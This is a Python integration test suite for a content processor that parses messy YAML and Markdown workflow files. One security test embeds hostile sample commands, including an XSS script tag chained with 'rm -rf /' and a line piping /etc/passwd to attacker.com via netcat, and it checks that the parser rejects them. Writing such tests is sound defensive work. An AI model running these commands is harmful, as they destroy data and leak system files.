#!/usr/bin/env python3

"""
Integration test for parsing messy content files.
Tests the complete pipeline from messy input to standardized output.
"""

import tempfile
import unittest
from pathlib import Path

import pytest

from warp_content_processor import ContentProcessor, ContentSplitter


class TestMessyContentIntegration(unittest.TestCase):
    """Integration tests for messy content parsing."""

    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.output_dir = Path(self.test_dir) / "output"
        self.fixtures_dir = Path(__file__).parent / "fixtures"
        self.messy_content_file = self.fixtures_dir / "messy_mixed_content.yaml"

    def tearDown(self):
        """Clean up test environment."""
        import shutil

        shutil.rmtree(self.test_dir)

    @pytest.mark.timeout(30)
    def test_parse_messy_mixed_content(self):
        """Test parsing of intentionally messy mixed content."""
        content = self.messy_content_file.read_text()
        documents = ContentSplitter.split_content(content)

        # Should successfully parse despite formatting issues
        self.assertGreater(len(documents), 0, "Should parse at least one document")

        # Check that we get the expected content types
        types_found = [doc_type.value for doc_type, _ in documents]

        # Should find workflow content
        self.assertIn(
            "workflow",
            types_found,
            f"Should detect workflow content. Found types: {types_found}",
        )

        # Should find prompt content
        self.assertIn(
            "prompt",
            types_found,
            f"Should detect prompt content. Found types: {types_found}",
        )

        # Should find rule content
        self.assertIn(
            "rule",
            types_found,
            f"Should detect rule content. Found types: {types_found}",
        )

    @pytest.mark.timeout(30)
    def test_robust_parsing_with_syntax_errors(self):
        """Test parsing content with YAML syntax errors."""
        malformed_content = """
        # This has intentional syntax errors
        ---
        name: Test Workflow
        command: echo "test"
        tags: [git, test  # Missing closing bracket
        description: This has errors
        shells:
          - bash
          - zsh
        invalid: {unclosed dict
        ---
        
        name: Another Workflow
        command: ls -la
        description: This one is valid
        """

        # Should not crash and should parse what it can
        documents = ContentSplitter.split_content(malformed_content)

        # Should return some results even with syntax errors
        self.assertIsInstance(documents, list)

        # At least one document should be parseable
        self.assertGreater(len(documents), 0)

    def test_normalize_poorly_formatted_workflow(self):
        """Test normalization of poorly formatted workflow."""
        messy_workflow = """
        name:Git Status Check
        command:git status&&git diff
        description:Check git status
        tags:git,status,diff
        shells:bash,zsh
        """

        documents = ContentSplitter.split_content(messy_workflow)

        # Should parse successfully
        self.assertEqual(len(documents), 1)
        doc_type, doc_content = documents[0]

        # Should be detected as workflow
        self.assertEqual(doc_type.value, "workflow")

        # Content should be properly formatted YAML
        self.assertIn("name:", doc_content)
        self.assertIn("command:", doc_content)

    def test_mixed_markdown_yaml_parsing(self):
        """Test parsing of mixed Markdown and YAML content."""
        mixed_content = """
        # My Project Workflows
        
        This document contains workflows and other content.
        
        ---
        name: Build Project
        command: npm run build
        description: Build the project
        tags:
          - build
          - npm
        ---
        
        ## Coding Standards
        
        title: Code Quality Rules
        description: Rules for maintaining code quality
        guidelines:
          - Use meaningful names
          - Write tests
          - Document APIs
        """

        documents = ContentSplitter.split_content(mixed_content)

        # Should parse multiple documents
        self.assertGreaterEqual(len(documents), 2)

        # Should find workflow
        types = [doc_type.value for doc_type, _ in documents]
        self.assertIn("workflow", types)

    @pytest.mark.timeout(60)
    def test_end_to_end_processing_messy_content(self):
        """Test complete end-to-end processing of messy content."""
        if not self.messy_content_file.exists():
            self.skipTest("Messy content fixture not found")

        # Create processor
        try:
            processor = ContentProcessor(self.output_dir)
        except Exception as e:
            self.skipTest(f"Could not create processor: {e}")

        # Process the messy file
        try:
            results = processor.process_file(self.messy_content_file)
        except Exception as e:
            self.fail(f"Processing failed: {e}")

        # Should get some results
        self.assertIsInstance(results, list)
        self.assertGreater(len(results), 0, "Should produce at least one result")

        # Check that output files were created
        if self.output_dir.exists():
            output_files = list(self.output_dir.rglob("*.yaml"))
            if output_files:
                # Verify output files are valid YAML
                for output_file in output_files:
                    try:
                        import yaml

                        with open(output_file) as f:
                            yaml.safe_load(f)
                    except yaml.YAMLError as e:
                        self.fail(f"Output file {output_file} is not valid YAML: {e}")

    def test_performance_with_large_messy_content(self):
        """Test performance with large amounts of messy content."""
        # Generate large messy content
        large_messy_parts = []

        for i in range(50):
            # Intentionally messy formatting
            large_messy_parts.append(
                f"""
---
name:Workflow {i}
command:echo "test {i}"&&ls -la
description:Generated workflow number {i}
tags:test,generated,item-{i}
shells:bash,zsh
arguments:
-name:input
 description:Input for workflow {i}
 default_value:default-{i}
"""
            )

        large_content = "\n".join(large_messy_parts)

        # Should parse all documents within reasonable time
        import time

        start_time = time.time()

        documents = ContentSplitter.split_content(large_content)

        end_time = time.time()
        parse_time = end_time - start_time

        # Should complete within 5 seconds
        self.assertLess(parse_time, 5.0, f"Parsing took too long: {parse_time:.2f}s")

        # Should find all 50 workflows
        self.assertEqual(len(documents), 50)

        # All should be detected as workflows
        for doc_type, _ in documents:
            self.assertEqual(doc_type.value, "workflow")

    def test_security_validation_in_messy_content(self):
        """Test that security validation works with messy content."""
        malicious_messy_content = """
        ---
        name:Evil Workflow
        command:<script>alert('xss')</script>&&rm -rf /
        description:This tries to be malicious
        ---
        
        name:Another Evil One
        command:cat /etc/passwd|nc attacker.com 1234
        """

        # Security validation should catch this
        documents = ContentSplitter.split_content(malicious_messy_content)

        # Should return empty list due to security rejection
        self.assertEqual(len(documents), 0, "Malicious content should be rejected")

    def test_unicode_handling_in_messy_content(self):
        """Test handling of Unicode characters in messy content."""
        unicode_content = """
        ---
        name: Workflow with émojis 🚀
        command: echo "Hello 世界"
        description: Testing Unicode handling
        tags: unicode, test, 国际化
        ---
        """

        # Should handle Unicode correctly
        documents = ContentSplitter.split_content(unicode_content)

        self.assertEqual(len(documents), 1)
        doc_type, doc_content = documents[0]

        # Should preserve Unicode characters
        self.assertIn("🚀", doc_content)
        self.assertIn("世界", doc_content)
        self.assertIn("国际化", doc_content)


if __name__ == "__main__":
    unittest.main()
